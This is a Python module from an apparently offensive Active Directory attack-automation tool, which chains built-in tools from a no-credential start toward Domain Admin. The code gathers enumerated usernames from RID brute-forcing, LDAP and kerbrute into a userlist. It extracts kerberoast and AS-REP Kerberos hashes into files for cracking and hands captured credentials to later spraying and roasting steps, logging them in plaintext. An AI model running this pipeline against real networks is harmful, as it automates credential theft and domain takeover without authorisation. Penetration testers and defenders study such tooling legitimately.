# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Run a playbook as a flat *sequence of built-in tools* with variable flow.

This is the built-in alternative to the monolithic ``ad_kill_chain`` macro. A
playbook can carry a ``run.sequence`` — an ordered list of steps, each naming a
built-in tool plus a lightweight ``when`` trigger:

    {"tool": "netexec_rid_brute", "when": "guest", "label": "RID-brute users"}

The runner executes each step in order and, crucially, does all the *parsing at
the Autopwn level* between steps (the thing the operator asked for):

  * every tool's output is harvested into canonical **variables** (username,
    password, domain, …) by the tool itself, and those auto-fill the next tool;
  * Kerberos hashes ($krb5tgs$/$krb5asrep$) are pulled out, written as
    ``account:hash`` and exposed as the ``hashfile`` variable so ``crack_hashes``
    can crack them;
  * enumerated users (RID / LDAP / kerbrute) are written to a user list and
    exposed as the ``userlist`` variable so spraying/roasting can consume it.

Each step is streamed live (into the job log the console watches), and the
``when`` trigger re-routes exactly like the chain did — e.g. the RID step only
fires when a guest session worked; the authenticated user dump only fires once a
credential exists. So the whole no-cred → Domain-Admin path stays effective while
being a transparent, editable list of built-in tools rather than a black box.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Callable

from . import store
from .facts import autofill

# ---- parsing (same signals the AD chain uses) ----------------------------
_HASH_RE = re.compile(r"\$krb5(?:tgs|asrep)\$\S+")
_TGS_ACCT = re.compile(r"\$krb5tgs\$\d+\$\*([^*$]+)\*?\$")
_ASREP_ACCT = re.compile(r"\$krb5asrep\$\d+\$([^@:$]+)@")
_RID_USER = re.compile(r"\\([^\s\\]+)\s+\(SidTypeUser\)")
_KERB_USER = re.compile(r"VALID USERNAME:\s+([^@\s]+)@")
# NetExec LDAP --users prints "domain\user  <lastPwdSet> ..." rows.
_LDAP_USER = re.compile(r"^LDAP\s+\S+\s+\d+\s+\S+\s+\S+\\([A-Za-z0-9._$\-]+)\b", re.M)


def _acct_of(h: str) -> str:
    m = _TGS_ACCT.search(h) or _ASREP_ACCT.search(h)
    return m.group(1) if m else ""


# Built-in accounts that must never go into the spray/roast user list — they are
# disabled and only produce NetExec "(Guest)" fallback noise.
_BUILTIN_USERS = {"guest", "defaultaccount", "wdagutilityaccount", "krbtgt", ""}


def _extract_users(text: str) -> set[str]:
    users: set[str] = set()
    for rx in (_RID_USER, _KERB_USER, _LDAP_USER):
        for u in rx.findall(text or ""):
            u = u.strip()
            if u and not u.endswith("$") and u.lower() not in _BUILTIN_USERS:
                users.add(u)
    return users


def _trigger_ok(when: str, f: dict) -> bool:
    """Lightweight per-step trigger evaluated against the current variables."""
    w = (when or "start").strip().lower()
    if w in ("", "start", "always"):
        return True
    if w in ("have credential", "have cred", "authenticated"):
        return bool(f.get("username") and f.get("password"))
    if w == "have password":
        return bool(f.get("password"))
    if w in ("no userlist", "no userlist yet"):
        return not f.get("userlist")
    if w == "have userlist":
        return bool(f.get("userlist"))
    if w in ("have hashes", "have hash"):
        return bool(f.get("hashfile"))
    if w == "guest":                       # a guest/null SMB session worked
        return bool(f.get("smb_guest"))
    if w == "signing disabled":
        return str(f.get("smb_signing")) == "False"
    return True                            # unknown trigger → don't block


def _persist_users(users: set[str], log_dir: str, report) -> None:
    if not users:
        return
    uf = Path(log_dir) / "users.txt"
    existing = set()
    if uf.exists():
        existing = {l.strip() for l in uf.read_text(encoding="utf-8",
                    errors="ignore").splitlines() if l.strip()}
    merged = sorted(existing | users)
    uf.parent.mkdir(parents=True, exist_ok=True)
    uf.write_text("\n".join(merged) + "\n", encoding="utf-8")
    store.set_fact("userlist", str(uf))
    report("var", f"    -> userlist = {uf} ({len(merged)} user(s))")


def _persist_hashes(text: str, log_dir: str, report) -> None:
    hashes = _HASH_RE.findall(text or "")
    if not hashes:
        return
    # Bucket by Kerberos format — a single john run can't mix krb5tgs/krb5asrep,
    # so each format gets its own hashfile written as "account:hash".
    buckets = {"krb5tgs": [], "krb5asrep": []}
    for h in hashes:
        buckets["krb5asrep" if h.startswith("$krb5asrep$") else "krb5tgs"].append(h)
    for fmt, hs in buckets.items():
        if not hs:
            continue
        hf = Path(log_dir) / "chain" / f"hashes_{fmt}.txt"
        hf.parent.mkdir(parents=True, exist_ok=True)
        lines = set()
        if hf.exists():
            lines = {l.strip() for l in hf.read_text(errors="ignore").splitlines() if l.strip()}
        for h in hs:
            acct = _acct_of(h)
            lines.add(f"{acct}:{h}" if acct else h)
        hf.write_text("\n".join(sorted(lines)) + "\n", encoding="utf-8")
        store.set_fact("hashfile", str(hf))   # current step's format wins
        report("var", f"    -> hashfile = {hf} ({len(lines)} {fmt} hash(es))")


def run_sequence(book: dict, target: str, ctx, reg,
                 report: Callable[[str, str], None], log_dir: str,
                 record: Callable[[str, object], None] | None = None) -> dict:
    """Execute a playbook's ``run.sequence`` against *target*.

    Returns a small summary dict (creds/users/steps). ``report(kind, msg)`` is
    called for every line so the caller can stream it to the job log; ``record``,
    if given, is called ``record(tool_name, result)`` after each step so the
    caller can append the tool output to a session transcript (for findings).
    """
    seq = ((book.get("run") or {}).get("sequence")) or []
    name = book.get("name", book.get("id", "playbook"))
    report("head", f"Built-in sequence: {name} — {len(seq)} step(s) against {target}")

    # Clear transient artifacts from any previous run so this one starts clean
    # (a stale spns.txt / hashfile must not look like fresh loot for this target).
    for stale in ("spns.txt", str(Path(log_dir) / "spns.txt")):
        try:
            Path(stale).unlink()
        except OSError:
            pass
    for hf in Path(log_dir).glob("chain/hashes_*.txt"):
        try:
            hf.unlink()
        except OSError:
            pass
    if store.get_fact("hashfile"):
        store.set_fact("hashfile", "")
    ran = 0
    for i, st in enumerate(seq, 1):
        tool_name = (st.get("tool") or "").strip()
        label = st.get("label") or tool_name
        when = st.get("when", "start")
        f = store.facts()
        if not _trigger_ok(when, f):
            report("skip", f"[{i}/{len(seq)}] skip {label} — trigger '{when}' not met")
            continue
        tool = reg.get(tool_name)
        if tool is None:
            report("skip", f"[{i}/{len(seq)}] {tool_name} unavailable — skipped")
            continue

        # Build args: auto-fill canonical variables, map aliases, apply the
        # step's fixed args, then pin the target.
        params = set(tool.parameters.get("properties", {}))
        filled = autofill(params)
        if "userfile" in params and "userfile" not in filled and f.get("userlist"):
            filled["userfile"] = f["userlist"]        # spray calls it userfile
        if "userlist" in params and "userlist" not in filled and f.get("userlist"):
            filled["userlist"] = f["userlist"]
        if "hashfile" in params and f.get("hashfile"):
            filled["hashfile"] = f["hashfile"]
        for k, v in (st.get("args") or {}).items():
            if v not in (None, ""):
                filled[k] = v
        if "target" in params:
            filled["target"] = target

        report("run", f"[{i}/{len(seq)}] {label}  ({tool_name})")
        try:
            r = tool.run(ctx, **filled)
        except Exception as e:
            report("err", f"    ! {tool_name}: {type(e).__name__}: {e}")
            continue
        ran += 1
        if record:
            record(tool_name, r)
        out = (getattr(r, "raw_output", "") or "") + "\n" + (getattr(r, "summary", "") or "")
        # Kerberoasting writes its hashes to spns.txt rather than stdout — fold the
        # file into this step's output so the hashes are parsed for the next step.
        if tool_name == "kerberoast":
            for sp in (Path(log_dir) / "spns.txt", Path("spns.txt")):
                if sp.exists():
                    out += "\n" + sp.read_text(errors="ignore")
                    break
        for line in [l for l in out.splitlines() if l.strip()][:14]:
            report("out", f"    {line}")

        # ---- parse this step's output into variables for the next steps ----
        _persist_users(_extract_users(out), log_dir, report)
        _persist_hashes(out, log_dir, report)
        # credentials/domain are harvested by the tool itself (facts layer);
        # surface any credential we now hold so the log shows the hand-off.
        u, p = store.get_fact("username"), store.get_fact("password")
        if u and p:
            dom = store.get_fact("domain") or ""
            report("cred", f"    Credential: {u}:{p} @ {dom or 'unknown'}")

    f = store.facts()
    report("done", f"Sequence complete — {ran} step(s) ran. "
                   f"user={f.get('username') or '-'} "
                   f"userlist={'yes' if f.get('userlist') else 'no'} "
                   f"hashes={'yes' if f.get('hashfile') else 'no'}")
    return {"ran": ran, "username": f.get("username"), "password": f.get("password"),
            "userlist": f.get("userlist"), "hashfile": f.get("hashfile")}
